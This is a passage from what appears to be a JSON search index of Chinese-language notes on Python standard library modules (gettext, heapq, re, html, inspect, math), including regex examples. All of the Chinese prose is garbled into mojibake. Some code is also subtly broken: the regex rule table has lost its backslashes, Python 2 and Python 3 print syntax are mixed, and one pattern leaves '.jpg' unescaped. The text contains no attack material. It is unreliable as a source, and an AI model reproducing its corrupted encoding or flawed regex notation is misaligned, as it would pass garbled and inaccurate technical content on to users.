ä¸Šæ˜¯ /usr/share/localeï¼Œ åœ¨ Solaris ä¸Šæ˜¯ /usr/lib/localeã€‚ gettext æ¨¡å—ä¸ä¼šæ”¯æŒè¿™äº›åŸºäºä¸åŒç³»ç»Ÿçš„é»˜è®¤å€¼ï¼› è€Œå®ƒçš„é»˜è®¤å€¼ä¸º sys.base_prefix/share/locale ï¼ˆè¯·å‚é˜… sys.base_prefixï¼‰ã€‚ åŸºäºä¸Šè¿°åŸå› ï¼Œæœ€å¥½æ¯æ¬¡éƒ½åœ¨åº”ç”¨ç¨‹åºçš„å¼€å¤´ä½¿ç”¨æ˜ç¡®çš„ç»å¯¹è·¯å¾„æ¥è°ƒç”¨ bindtextdomain ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-gettext.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-gettext.html"},{"title":"heapq","text":"å®˜ç½‘: heapq --- å †é˜Ÿåˆ—ç®—æ³• æ¨¡å—æä¾›äº†å †é˜Ÿåˆ—ç®—æ³•çš„å®ç°ï¼Œä¹Ÿç§°ä¸ºä¼˜å…ˆé˜Ÿåˆ—ç®—æ³•. å †æ˜¯ä¸€ä¸ªäºŒå‰æ ‘ï¼Œå®ƒçš„æ¯ä¸ªçˆ¶èŠ‚ç‚¹çš„å€¼éƒ½åªä¼šå°äºæˆ–ç­‰äºæ‰€æœ‰å­©å­èŠ‚ç‚¹ï¼ˆçš„å€¼ï¼‰ã€‚ å®ƒä½¿ç”¨äº†æ•°ç»„æ¥å®ç°ï¼šä»é›¶å¼€å§‹è®¡æ•°ï¼Œå¯¹äºæ‰€æœ‰çš„ k ï¼Œéƒ½æœ‰ heap[k] <= heap[2*k+1] å’Œ heap[k] <= heap[2*k+2]ã€‚ ä¸ºäº†ä¾¿äºæ¯”è¾ƒï¼Œä¸å­˜åœ¨çš„å…ƒç´ è¢«è®¤ä¸ºæ˜¯æ— é™å¤§ã€‚ å †æœ€æœ‰è¶£çš„ç‰¹æ€§åœ¨äºæœ€å°çš„å…ƒç´ æ€»æ˜¯åœ¨æ ¹ç»“ç‚¹ï¼šheap[0]ã€‚ å †çš„åˆ†ç±» å¤§æ ¹å † å¤§æ ¹å †çš„æ¯ä¸ªå­æ ‘ï¼Œæ ¹èŠ‚ç‚¹æ˜¯æ•´ä¸ªæ ‘ä¸­æœ€å¤§çš„æ•°æ®ï¼Œ æ¯ä¸ªèŠ‚ç‚¹çš„æ•°æ®éƒ½æ¯”å…¶å­èŠ‚ç‚¹å¤§ å°æ ¹å † å°æ ¹å †çš„æ ¹èŠ‚ç‚¹æ•°æ®æ˜¯æœ€å°çš„æ•°æ®ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„æ•°æ®éƒ½æ¯”å…¶å­èŠ‚ç‚¹å° APIä¸æ•™æçš„å †ç®—æ³•å®ç°æœ‰æ‰€ä¸åŒï¼Œå…·ä½“åŒºåˆ«æœ‰ä¸¤æ–¹é¢ æˆ‘ä»¬ä½¿ç”¨äº†ä»é›¶å¼€å§‹çš„ç´¢å¼•ã€‚ è¿™ä½¿å¾—èŠ‚ç‚¹å’Œå…¶å­©å­èŠ‚ç‚¹ç´¢å¼•ä¹‹é—´çš„å…³ç³»ä¸å¤ªç›´è§‚ä½†æ›´åŠ é€‚åˆï¼Œå› ä¸º Python ä½¿ç”¨ä»é›¶å¼€å§‹çš„ç´¢å¼•ã€‚ æˆ‘ä»¬çš„ pop æ–¹æ³•è¿”å›æœ€å°çš„é¡¹è€Œä¸æ˜¯æœ€å¤§çš„é¡¹ï¼ˆè¿™åœ¨æ•™æä¸­ç§°ä¸º\"æœ€å°å †\"ï¼›è€Œ\"æœ€å¤§å †\"åœ¨æ•™æä¸­æ›´ä¸ºå¸¸è§ï¼Œå› ä¸ºå®ƒæ›´é€‚ç”¨äºåŸåœ°æ’åºï¼‰ã€‚ åˆ›å»ºä¸€ä¸ªå †ï¼Œå¯ä»¥ä½¿ç”¨listæ¥åˆå§‹åŒ–ä¸º [] ï¼Œæˆ–è€…ä½ å¯ä»¥é€šè¿‡ä¸€ä¸ªå‡½æ•° heapify() ï¼Œæ¥æŠŠä¸€ä¸ªlistè½¬æ¢æˆå †ã€‚ æ”¯æŒå‡½æ•° heappush , æ¨å…¥å€¼åˆ°å † heappop , å¼¹å‡ºå€¼ heappushpop , ç›¸å½“äº å…ˆåš heappush , å†åš heappop heapify , å°† list åŸåœ°è½¬æ¢ä¸º å † heapreplace merge nlargest nsmallest è¯¥æ¨¡å—è¿˜æä¾›äº†ä¸‰ä¸ªåŸºäºå †çš„é€šç”¨åŠŸèƒ½å‡½æ•°ã€‚ åä¸¤ä¸ªå‡½æ•°åœ¨ n å€¼è¾ƒå°æ—¶æ€§èƒ½æœ€å¥½ã€‚ å¯¹äºæ›´å¤§çš„å€¼ï¼Œä½¿ç”¨ sorted() å‡½æ•°ä¼šæ›´æœ‰æ•ˆç‡ã€‚ æ­¤å¤–ï¼Œå½“ n==1 æ—¶ï¼Œä½¿ç”¨å†…ç½®çš„ min() å’Œ max() å‡½æ•°ä¼šæ›´æœ‰æ•ˆç‡ã€‚ å¦‚æœéœ€è¦é‡å¤ä½¿ç”¨è¿™äº›å‡½æ•°ï¼Œè¯·è€ƒè™‘å°†å¯è¿­ä»£å¯¹è±¡è½¬ä¸ºçœŸæ­£çš„å †ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-heapq.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-heapq.html"},{"title":"re","text":"é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼å¯¹å­—ç¬¦ä¸²è¿›â¾åŒ¹é… r åœ¨å¸¦æœ‰ 'r' å‰ç¼€çš„å­—ç¬¦ä¸²å­—é¢å€¼ä¸­ï¼Œåæ–œæ ä¸å¿…åšä»»ä½•ç‰¹æ®Šå¤„ç†ã€‚ å› æ­¤ r\"n\" è¡¨ç¤ºåŒ…å« '' å’Œ 'n' ä¸¤ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œ è€Œ \"n\" åˆ™è¡¨ç¤ºåªåŒ…å«ä¸€ä¸ªæ¢è¡Œç¬¦çš„å­—ç¬¦ä¸²ã€‚ re.matchå‡½æ•° re.compile å‡½æ•° compile å‡½æ•°ç”¨äºç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”Ÿæˆä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼ˆ Pattern ï¼‰å¯¹è±¡ï¼Œä¾› match() å’Œ search() è¿™ä¸¤ä¸ªå‡½æ•°ä½¿ç”¨: prog = re.compile(pattern) result = prog.match(string) ç­‰ä»·äº: result = re.match(pattern, string) ä¸è¿‡å¯¹äºåŒ¹é…ä½¿ç”¨çš„è¾ƒå¤šæƒ…å†µä¸‹, å¯ä»¥ä½¿ç”¨å…¨å±€çš„compileæ¥èŠ‚çœæ—¶é—´. ä¸¾ä¾‹: >>>import re >>> pattern = re.compile(r'\\d+') m = pattern.match('one12twothree34four', 3, 10) # ä»'1'çš„ä½ç½®å¼€å§‹åŒ¹é…ï¼Œæ­£å¥½åŒ¹é… >>> print m # è¿”å›ä¸€ä¸ª Match å¯¹è±¡ <_sre.SRE_Match object at 0x10a42aac0> >>> m.group(0) # å¯çœç•¥ 0 '12' >>> m.start(0) # å¯çœç•¥ 0 3 >>> m.end(0) # å¯çœç•¥ 0 5 >>> m.span(0) # å¯çœç•¥ 0 (3, 5) åœ¨ä¸Šé¢ï¼Œå½“åŒ¹é…æˆåŠŸæ—¶è¿”å›ä¸€ä¸ª Match å¯¹è±¡ï¼Œå…¶ä¸­ï¼š group([group1, â€¦]) æ–¹æ³•ç”¨äºè·å¾—ä¸€ä¸ªæˆ–å¤šä¸ªåˆ†ç»„åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œå½“è¦è·å¾—æ•´ä¸ªåŒ¹é…çš„å­ä¸²æ—¶ï¼Œå¯ç›´æ¥ä½¿ç”¨ group() æˆ– group(0)ï¼› start([group]) æ–¹æ³•ç”¨äºè·å–åˆ†ç»„åŒ¹é…çš„å­ä¸²åœ¨æ•´ä¸ªå­—ç¬¦ä¸²ä¸­çš„èµ·å§‹ä½ç½®ï¼ˆå­ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•ï¼‰ï¼Œå‚æ•°é»˜è®¤å€¼ä¸º 0ï¼› end([group]) æ–¹æ³•ç”¨äºè·å–åˆ†ç»„åŒ¹é…çš„å­ä¸²åœ¨æ•´ä¸ªå­—ç¬¦ä¸²ä¸­çš„ç»“æŸä½ç½®ï¼ˆå­ä¸²æœ€åä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•+1ï¼‰ï¼Œå‚æ•°é»˜è®¤å€¼ä¸º 0ï¼› span([group]) æ–¹æ³•è¿”å› (start(group), end(group)) re.searchå‡½æ•° re.search æ‰«ææ•´ä¸ªå­—ç¬¦ä¸²å¹¶è¿”å›ç¬¬ä¸€ä¸ªæˆåŠŸçš„åŒ¹é…ï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…ï¼Œå°±è¿”å›ä¸€ä¸ª Noneã€‚ re.matchä¸re.searchçš„åŒºåˆ«: re.matchåªåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ï¼Œå¦‚æœå­—ç¬¦ä¸²å¼€å§‹ä¸ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œåˆ™åŒ¹é…å¤±è´¥ï¼Œå‡½æ•°è¿”å›None re.searchåŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåŒ¹é… ä¸¾ä¾‹: import re ret = re.search(r\"\\d+\", \"é˜…è¯»æ¬¡æ•°ä¸º9999\") print(ret.group()) #ç»“æœï¼š9999 re.findallå‡½æ•° åœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°æ­£åˆ™è¡¨è¾¾å¼æ‰€åŒ¹é…çš„æ‰€æœ‰å­ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„ï¼Œåˆ™è¿”å›ç©ºåˆ—è¡¨ã€‚ æ³¨æ„ï¼š match å’Œ search æ˜¯åŒ¹é…ä¸€æ¬¡ findall åŒ¹é…æ‰€æœ‰ã€‚ ä¸¾ä¾‹: import re ret = re.findall(r\"\\d+\", \"python = 9999, c = 7890, c++ = 12345\") print(ret) #ç»“æœï¼š['9999', '7890', '12345'] ä¸¾ä¾‹2: import re alist = ['a','b','c'] if re.findall('.$','dfghc')[0] in alist: print 'yes1' if re.findall('.$','dfgh')[0] in alist: print 'yes2' print 'over' #è¾“å‡ºï¼š #yes1 #over #re.findall('.$','dfghc')å…¶å®æ˜¯è¿”å›ä¸€ä¸ªåˆ—è¡¨ #ä½†æ˜¯åŒ¹é…æ˜¯æ‰¾å‡ºç»“å°¾çš„å­—ç¬¦æ‰€ä»¥åªæœ‰ä¸€ä¸ªï¼Œä½¿ç”¨[0]è·å– #ç„¶ååˆ¤æ–­æ˜¯å¦å­˜åœ¨äºalist re.finditerå‡½æ•° å’Œ findall ç±»ä¼¼ï¼Œåœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°æ­£åˆ™è¡¨è¾¾å¼æ‰€åŒ¹é…çš„æ‰€æœ‰å­ä¸²ï¼Œå¹¶æŠŠå®ƒä»¬ä½œä¸ºä¸€ä¸ªè¿­ä»£å™¨è¿”å›: import re it = re.finditer(r\"\\d+\", \"12a32bc43jf3\") for match in it: print(match.group()) #ç»“æœï¼š #12 #32 #43 #3 re.subå‡½æ•° subæ˜¯substituteçš„æ‰€å†™ï¼Œè¡¨ç¤ºæ›¿æ¢ï¼Œå°†åŒ¹é…åˆ°çš„æ•°æ®è¿›â¾æ›¿æ¢ã€‚ ä¸¾ä¾‹ï¼šå°†åŒ¹é…åˆ°çš„é˜…è¯»æ¬¡æ•°åŠ 1 æ–¹æ³•ä¸€: import re ret = re.sub(r\"\\d+\", '998', \"python = 997\") print(ret) ç»“æœï¼špython = 998 æ–¹æ³•äºŒ: import re def add(temp): #intï¼ˆï¼‰å‚æ•°å¿…é¡»æ˜¯å­—ç¬¦ä¸²ï¼Œç±»ä¼¼å­—èŠ‚çš„å¯¹è±¡æˆ–æ•°å­—ï¼Œè€Œä¸æ˜¯\"re.Match\" strNum = temp.group() num = int(strNum) + 1 return str(num) ret = re.sub(r\"\\d+\", add, \"python = 997\") print(ret) ret = re.sub(r\"\\d+\", add, \"python = 99\") print(ret) #è¿™é‡Œä¸æ‡‚æ˜¯æ€ä¹ˆæŠŠåé¢çš„å‚æ•°ä¼ é€’è¿‡å»çš„ï¼Œ #å¥½åƒpythonå°±æ˜¯è¿™æ ·ä¼ é€’å‚æ•°çš„ï¼Ÿä½†æ˜¯æœ‰å°è¯•å°†tempæ‰“å°ï¼Œå‡ºæ¥æ˜¯ä¸€ä¸ªåœ°å€å¥½åƒï¼Œå¹¶ä¸æ˜¯é¢„æœŸçš„å­—ç¬¦ä¸² #ç†è§£æ˜¯æ­£å¸¸æƒ…å†µä¸‹ä¼ é€’çš„åº”è¯¥æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™é‡Œä½¿ç”¨äº†æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ•°å­—ï¼Œæ‰€ä»¥åªä¼ é€’äº†æ•°å­—ï¼Œç„¶åä½¿ç”¨groupå‡½æ•°æ¥è·å– #æ ¹æ®è¿™ä¸ªæ€è·¯å°è¯•äº†ä¸€ä¸‹ #å°†åŒ¹é…è§„åˆ™æ›´æ”¹ä¸º\"r\".+\",è¾“å‡ºtemp.groupçš„å€¼æ­£å¸¸ï¼Œtempä¸ºåœ°å€ï¼Œreä¼šå°†å‚æ•°ä¼ é€’æ›´æ”¹ä¸ºåœ°å€ä¼ é€’ ç»“æœ: python = 998 python = 100 re.subnå‡½æ•° è¡Œä¸ºä¸sub()ç›¸åŒï¼Œä½†æ˜¯è¿”å›ä¸€ä¸ªå…ƒç»„ (å­—ç¬¦ä¸², æ›¿æ¢æ¬¡æ•°): re.subn(pattern, repl, string[, count]) è¿”å›: (sub(repl, string[, count]), æ›¿æ¢æ¬¡æ•°) ä¾‹å¦‚: import re pattern = re.compile(r'(\\w+) (\\w+)') s = 'i say, hello world!' print(re.subn(pattern, r'\\2 \\1', s)) def func(m): return m.group(1).title() + ' ' + m.group(2).title() print(re.subn(pattern, func, s)) ### output ### # ('say i, world hello!', 2) # ('I Say, Hello World!', 2) re.splitå‡½æ•° æ ¹æ®åŒ¹é…è¿›â¾åˆ‡å‰²å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›â¼€ä¸ªåˆ—è¡¨ã€‚ ä¸¾ä¾‹: import re ret = re.split(r\":| \",\"info:xiaoZhang 33 shandong\") print(ret) ç»“æœï¼š['info', 'xiaoZhang', '33', 'shandong'] pythonè´ªå©ªå’Œâ¾®è´ªå©ª Pythonâ¾¥æ•°é‡è¯é»˜è®¤æ˜¯è´ªå©ªçš„ï¼ˆåœ¨å°‘æ•°è¯­â¾”â¾¥ä¹Ÿå¯èƒ½æ˜¯é»˜è®¤â¾®è´ªå©ªï¼‰ï¼Œæ€»æ˜¯å°è¯•åŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦ï¼›â¾®è´ªå©ªåˆ™ç›¸åï¼Œæ€»æ˜¯å°è¯•åŒ¹é…å°½å¯èƒ½å°‘çš„å­—ç¬¦ã€‚ ä¾‹å¦‚ï¼šæ­£åˆ™è¡¨è¾¾å¼\"ab*\"å¦‚æœç”¨äºæŸ¥æ‰¾\"abbbc\"ï¼Œå°†æ‰¾åˆ°\"abbb\"ã€‚è€Œå¦‚æœä½¿ç”¨éè´ªå©ªçš„æ•°é‡è¯\"ab*?\"ï¼Œå°†æ‰¾åˆ°\"a\"ã€‚ æ³¨ï¼šæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨éè´ªå©ªæ¨¡å¼æ¥æå–ã€‚ åœ¨\"*\",\"?\",\"+\",\"{m,n}\"åâ¾¯åŠ ä¸Šï¼Ÿï¼Œä½¿è´ªå©ªå˜æˆâ¾®è´ªå©ªã€‚ ä¸¾ä¾‹1: import re s=\"This is a number 234-235-22-423\" #æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä½¿â½¤åˆ°é€šé…å­—ï¼Œé‚£å®ƒåœ¨ä»å·¦åˆ°å³çš„é¡ºåºæ±‚å€¼æ—¶ï¼Œä¼šå°½é‡\"æŠ“å–\"æ»¡â¾œåŒ¹é…æœ€â»“å­—ç¬¦ä¸²ï¼Œåœ¨æˆ‘ä»¬ä¸Šâ¾¯çš„ä¾‹â¼¦â¾¥â¾¯ï¼Œ\".+\"ä¼šä»å­—ç¬¦ä¸²çš„å¯å§‹å¤„æŠ“å–æ»¡â¾œæ¨¡å¼çš„æœ€â»“å­—ç¬¦ï¼Œå…¶ä¸­åŒ…æ‹¬æˆ‘ä»¬æƒ³å¾—åˆ°çš„ç¬¬â¼€ä¸ªæ•´å‹å­—æ®µçš„ä¸­çš„â¼¤éƒ¨åˆ†ï¼Œ\"\\d+\"åªéœ€â¼€ä½å­—ç¬¦å°±å¯ä»¥åŒ¹é…ï¼Œæ‰€ä»¥å®ƒåŒ¹é…äº†æ•°å­—\"4\"ï¼Œâ½½\".+\"åˆ™åŒ¹é…äº†ä»å­—ç¬¦ä¸²èµ·å§‹åˆ°è¿™ä¸ªç¬¬â¼€ä½æ•°å­—4ä¹‹å‰çš„æ‰€æœ‰å­—ç¬¦ r=re.match(\".+(\\d+-\\d+-\\d+-\\d+)\",s) print(r.group(1)) #â¾®è´ªå©ªæ“ä½œç¬¦\"ï¼Ÿ\"ï¼Œè¿™ä¸ªæ“ä½œç¬¦å¯ä»¥â½¤åœ¨\"*\",\"+\",\"?\"çš„åâ¾¯ï¼Œè¦æ±‚æ­£åˆ™åŒ¹é…çš„è¶Šå°‘è¶Šå¥½ r=re.match(\".+?(\\d+-\\d+-\\d+-\\d+)\",s) print(r.group(1)) ç»“æœ: 4-235-22-423 234-235-22-423 ä¸¾ä¾‹2: >>> re.match(r\"aa(\\d+)\",\"aa2343ddd\").group(1) '2343' >>> re.match(r\"aa(\\d+?)\",\"aa2343ddd\").group(1) '2' >>> re.match(r\"aa(\\d+)ddd\",\"aa2343ddd\").group(1) '2343' >>> re.match(r\"aa(\\d+?)ddd\",\"aa2343ddd\").group(1) '2343' ä¸¾ä¾‹3ï¼šæå–å›¾ç‰‡åœ°å€: import re test_str=\"<img data-original=https://rpic.douyucdn.cn/appCovers/2016/11/13/1213973.jpg>\" ret = re.search(r\"https://.*?.jpg\", test_str) print(ret.group()) rçš„ä½œâ½¤ rï¼šåœ¨å¸¦æœ‰ 'r' å‰ç¼€çš„å­—ç¬¦ä¸²å­—é¢å€¼ä¸­ï¼Œåæ–œæ ä¸å¿…åšä»»ä½•ç‰¹æ®Šå¤„ç†ã€‚ å› æ­¤ r\"n\" è¡¨ç¤ºåŒ…å« '' å’Œ 'n' ä¸¤ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œè€Œ \"n\" åˆ™è¡¨ç¤ºåªåŒ…å«ä¸€ä¸ªæ¢è¡Œç¬¦çš„å­—ç¬¦ä¸²ã€‚ ä¸å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ç›¸åŒï¼Œæ­£åˆ™è¡¨è¾¾å¼é‡Œä½¿ç”¨\"\"ä½œä¸ºè½¬ä¹‰å­—ç¬¦ï¼Œè¿™å°±å¯èƒ½é€ æˆåæ–œæ å›°æ‰°ã€‚å‡å¦‚ä½ éœ€è¦åŒ¹é…æ–‡æœ¬ä¸­çš„å­—ç¬¦\"\"ï¼Œé‚£ä¹ˆä½¿ç”¨ç¼–ç¨‹è¯­è¨€è¡¨ç¤ºçš„æ­£åˆ™è¡¨è¾¾å¼é‡Œå°†éœ€è¦4ä¸ªåæ–œæ \"\\\\\"ï¼šå‰ä¸¤ä¸ªå’Œåä¸¤ä¸ªåˆ†åˆ«ç”¨äºåœ¨ç¼–ç¨‹è¯­è¨€é‡Œè½¬ä¹‰æˆåæ–œæ ï¼Œè½¬æ¢æˆä¸¤ä¸ªåæ–œæ åå†åœ¨æ­£åˆ™è¡¨è¾¾å¼é‡Œè½¬ä¹‰æˆä¸€ä¸ªåæ–œæ ã€‚Pythoné‡Œçš„åŸç”Ÿå­—ç¬¦ä¸²å¾ˆå¥½åœ°è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼ŒPythonä¸­å­—ç¬¦ä¸²å‰â¾¯åŠ ä¸Š r è¡¨ç¤ºåŸâ½£å­—ç¬¦ä¸²ã€‚ ï¼ˆå‰ä¸¤ä¸ªå’Œåä¸¤ä¸ªåˆ†åˆ«ç”¨äºåœ¨ç¼–ç¨‹è¯­è¨€é‡Œè½¬ä¹‰æˆåæ–œæ ï¼Œè½¬æ¢æˆä¸¤ä¸ªåæ–œæ åå†åœ¨æ­£åˆ™è¡¨è¾¾å¼é‡Œè½¬ä¹‰æˆä¸€ä¸ªåæ–œæ ã€‚ï¼‰ ä¾‹: import re mm = \"c:\\\\a\\\\b\\\\c\" print(mm)#c:\\a\\b\\c ret = re.match(\"c:\\\\\\\\\",mm).group() print(ret)#c:\\ ret = re.match(\"c:\\\\\\\\a\",mm).group() print(ret)#c:\\a ret = re.match(r\"c:\\\\a\",mm).group() print(ret)#c:\\a ret = re.match(r\"c:\\a\",mm).group() print(ret)#AttributeError: 'NoneType' object has no attribute 'group' æ­£åˆ™åŒ¹é…è§„åˆ™(åŸºæœ¬é€‚ç”¨æ‰€æœ‰è¯­è¨€) åŒ¹é…å•ä¸ªå­—ç¬¦ å­—ç¬¦ åŠŸèƒ½ ä½ç½® . åŒ¹é…ä»»æ„1ä¸ªå­—ç¬¦ï¼ˆé™¤äº†nï¼‰ [ ] åŒ¹é…[ ]ä¸­åˆ—ä¸¾çš„å­—ç¬¦ d åŒ¹é…æ•°å­—ï¼Œå³0-9 å¯ä»¥å†™åœ¨å­—ç¬¦é›†[...]ä¸­ D åŒ¹é…â¾®æ•°å­—ï¼Œå³ä¸æ˜¯æ•°å­— å¯ä»¥å†™åœ¨å­—ç¬¦é›†[...]ä¸­ s åŒ¹é…ç©ºâ½©ï¼Œå³ç©ºæ ¼ï¼Œtabé”® å¯ä»¥å†™åœ¨å­—ç¬¦é›†[...]ä¸­ S åŒ¹é…â¾®ç©ºâ½©å­—ç¬¦ å¯ä»¥å†™åœ¨å­—ç¬¦é›†[...]ä¸­ w åŒ¹é…å•è¯å­—ç¬¦ï¼Œå³a-zã€A-Zã€0-9ã€_ å¯ä»¥å†™åœ¨å­—ç¬¦é›†[...]ä¸­ W åŒ¹é…â¾®å•è¯å­—ç¬¦ å¯ä»¥å†™åœ¨å­—ç¬¦é›†[...]ä¸­ ä½¿ç”¨æ‹¬å·åŒ¹é…çš„å†…å®¹, å¯ä»¥ç”¨ \\1 , \\2 è¡¨ç¤º, å¦‚: In [17]: re.sub(r'([a-z]+)([A-Z)]+)', r'\\1_\\2', 'distributeType').lower() Out[17]: 'distribute_type' # è¿™é‡Œä¸æ‡‚ä¸ºä»€ä¹ˆåŠ ä¸åŠ  + ä¸€æ · # todo: + In [18]: re.sub(r'([a-z])([A-Z)])', r'\\1_\\2', 'distributeType').lower() Out[18]: 'distribute_type' \\s ï¼šè¡¨ç¤ºåŒ¹é…ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ç­‰ã€‚å®ƒä¸[rntfv ]ç­‰æ•ˆã€‚ \\b ï¼šè¡¨ç¤ºåŒ¹é…å•è¯è¾¹ç•Œã€‚ä¸€ä¸ªå•è¯è¢«å®šä¹‰ä¸ºç”±å­—æ¯æˆ–æ•°å­—ç»„æˆçš„å­—ç¬¦åºåˆ—ã€‚båŒ¹é…ä½äºå•è¯å¼€å¤´æˆ–ç»“å°¾çš„ä½ç½®ï¼Œè€Œä¸åŒ¹é…ä»»ä½•å®é™…å­—ç¬¦ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-hot.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-hot.html"},{"title":"html","text":"å®˜ç½‘: html --- è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ”¯æŒ è¯¥æ¨¡å—å®šä¹‰äº†æ“ä½œHTMLçš„å·¥å…·ã€‚ html åŒ…ä¸­çš„å­æ¨¡å—æ˜¯ï¼š html.parser â€”â€” å…·æœ‰å®½æ¾è§£ææ¨¡å¼çš„HTML / XHTMLè§£æå™¨ html.entities -- HTML å®ä½“å®šä¹‰ html.parser å®˜ç½‘: https://docs.python.org/zh-cn/3/library/html.parser.html#module-html.parser ç®€å•çš„ HTML å’Œ XHTML è§£æå™¨ è¿™ä¸ªæ¨¡å—å®šä¹‰äº†ä¸€ä¸ª HTMLParser ç±»ï¼Œä¸º HTMLï¼ˆè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼‰å’Œ XHTML æ–‡æœ¬æ–‡ä»¶è§£ææä¾›åŸºç¡€ã€‚ html.entities HTML ä¸€èˆ¬å®ä½“çš„å®šä¹‰ è¯¥æ¨¡å—å®šä¹‰äº†å››ä¸ªè¯å…¸ï¼Œ html5ã€ name2codepointã€ codepoint2nameã€ä»¥åŠ entitydefsã€‚ html.entities.html5 å°† HTML5 å‘½åå­—ç¬¦å¼•ç”¨ 1 æ˜ å°„åˆ°ç­‰æ•ˆçš„ Unicode å­—ç¬¦çš„å­—å…¸ï¼Œä¾‹å¦‚ html5['gt;'] == '>'ã€‚ è¯·æ³¨æ„ï¼Œå°¾éšçš„åˆ†å·åŒ…å«åœ¨åç§°ä¸­ï¼ˆä¾‹å¦‚ 'gt;' ï¼‰ï¼Œä½†æ˜¯å³ä½¿æ²¡æœ‰åˆ†å·ï¼Œä¸€äº›åç§°ä¹Ÿä¼šè¢«æ ‡å‡†æ¥å—ï¼Œ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåç§°å‡ºç°æ—¶å¸¦æœ‰å’Œä¸å¸¦æœ‰ ';'ã€‚å¦è§ html.unescape()ã€‚ 3.3 æ–°ç‰ˆåŠŸèƒ½. html.entities.entitydefs å°† XHTML 1.0 å®ä½“å®šä¹‰æ˜ å°„åˆ° ISO Latin-1 ä¸­çš„æ›¿æ¢æ–‡æœ¬çš„å­—å…¸ã€‚ html.entities.name2codepoint å°† HTML å®ä½“åç§°æ˜ å°„åˆ° Unicode ä»£ç ç‚¹çš„å­—å…¸ã€‚ html.entities.codepoint2name å°† Unicode ä»£ç ç‚¹æ˜ å°„åˆ° HTML å®ä½“åç§°çš„å­—å…¸ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-html.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-html.html"},{"title":"inspect","text":"inspect.signature å¯è¿›è¡Œå‚æ•°æ£€æŸ¥","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-inspect.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-inspect.html"},{"title":"math","text":"å®˜ç½‘: math --- æ•°å­¦å‡½æ•° è¯¥æ¨¡å—æä¾›äº†å¯¹Cæ ‡å‡†å®šä¹‰çš„æ•°å­¦å‡½æ•°çš„è®¿é—®ã€‚ è¿™äº›å‡½æ•°ä¸é€‚ç”¨äºå¤æ•°ï¼›å¦‚æœä½ éœ€è¦è®¡ç®—å¤æ•°ï¼Œè¯·ä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/cmath æ¨¡å—ä¸­çš„åŒåå‡½æ•°ã€‚ å°†æ”¯æŒè®¡ç®—å¤æ•°çš„å‡½æ•°åŒºåˆ†å¼€çš„ç›®çš„ï¼Œæ¥è‡ªäºå¤§å¤šæ•°å¼€å‘è€…å¹¶ä¸æ„¿æ„åƒæ•°å­¦å®¶ä¸€æ ·éœ€è¦å­¦ä¹ å¤æ•°çš„æ¦‚å¿µã€‚ å¾—åˆ°ä¸€ä¸ªå¼‚å¸¸è€Œä¸æ˜¯ä¸€ä¸ªå¤æ•°ç»“æœä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿæ›´æ—©åœ°ç›‘æµ‹åˆ°ä¼ é€’ç»™è¿™äº›å‡½æ•°çš„å‚æ•°ä¸­åŒ…å«å¤æ•°ï¼Œè¿›è€Œè°ƒæŸ¥å…¶äº§ç”Ÿçš„åŸå› ã€‚ è¯¥æ¨¡å—æä¾›äº†ä»¥ä¸‹å‡½æ•°ã€‚é™¤éå¦æœ‰æ˜ç¡®è¯´æ˜ï¼Œå¦åˆ™æ‰€æœ‰è¿”å›å€¼å‡ä¸ºæµ®ç‚¹æ•°ã€‚ æ•°è®ºä¸è¡¨ç¤ºå‡½æ•° æ³¨æ„ frexp() å’Œ modf() å…·æœ‰ä¸å®ƒä»¬çš„Cç­‰ä»·å‡½æ•°ä¸åŒçš„è°ƒç”¨/è¿”å›æ¨¡å¼ï¼š å®ƒä»¬é‡‡ç”¨å•ä¸ªå‚æ•°å¹¶è¿”å›ä¸€å¯¹å€¼ï¼Œè€Œä¸æ˜¯é€šè¿‡ 'è¾“å‡ºå½¢å‚' 